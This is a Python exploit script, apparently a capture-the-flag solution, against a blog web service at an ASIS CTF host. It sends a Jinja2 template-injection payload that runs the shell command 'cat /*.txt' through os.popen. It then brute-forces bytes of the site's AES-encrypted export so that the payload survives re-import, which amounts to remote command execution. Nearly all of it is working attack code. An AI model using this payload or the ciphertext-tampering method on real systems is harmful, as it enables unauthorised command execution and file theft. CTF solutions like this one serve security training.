#!/usr/bin/env python3
from Crypto.Cipher import AES
import requests
import zipfile
import base64
import io
import os
from pwn import p8,p16
target = 'http://hugeblog.asisctf.com:9000'

s = requests.session()

r = s.post(f'{target}/api/login',json={
	'username':'lmao1337',
	'password':'lmao1337'
}).json()
assert r['result'] == 'OK'

buf = 'A'*(100+15)
buf+= "{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /*.txt').read() }}"

buf = buf.ljust(65501,'z')
v = 65304+26+16-2
wow = '"}'*1
buf = buf[:v]+wow+buf[len(wow)+v:]

r = s.post(f'{target}/api/new',json={
	'content': buf,
	'title':'A'*50
}).json()
assert r['result'] == 'OK'

r = s.get(f'{target}/api/export').json()
assert r['result'] == 'OK'
buf = base64.b64decode(r['export'])

##########
iv = buf[:16]
enc = buf[16:]

for i in range(0xffff):
	v = 60658+5000-1-16-1-1
	wow = p16(i)
	enc = enc[:v]+wow+enc[v+len(wow):]

	buf = iv+enc
	##########
	r = s.post(f'{target}/api/import',json={
		'import':base64.b64encode(buf).decode()
	})
	if(s.get(f'{target}/post/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA').status_code != 500):
		break
for i in range(0xffff):
	v = 600-1-12*16+3-1	
	wow = os.urandom(2)
	enc = enc[:v]+wow+enc[v+len(wow):]

	buf = iv+enc
	##########
	r = s.post(f'{target}/api/import',json={
		'import':base64.b64encode(buf).decode()
	})
	g = s.get(f'{target}/post/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
	# print(g.text)
	if(g.status_code != 500):
		v = s.get(f'{target}/post/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA').text
		try:
			z = v.index('{ self')
			print(v[z-1:z+1])
		except:
			print('LMAO',v)

